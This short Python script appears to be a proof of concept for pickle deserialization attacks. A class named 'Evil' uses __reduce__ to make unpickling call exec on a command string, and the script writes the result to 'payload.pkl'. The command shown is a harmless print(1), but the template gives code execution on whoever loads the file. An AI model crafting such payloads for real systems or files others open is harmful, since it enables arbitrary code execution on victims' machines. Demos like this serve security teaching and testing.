import pickle


class Evil:
    def __init__(self, cmd):
        self._cmd = cmd

    def __reduce__(self):
        return exec, (self._cmd,)


pickle.dump(Evil("print(1)"), open("payload.pkl", "wb"))
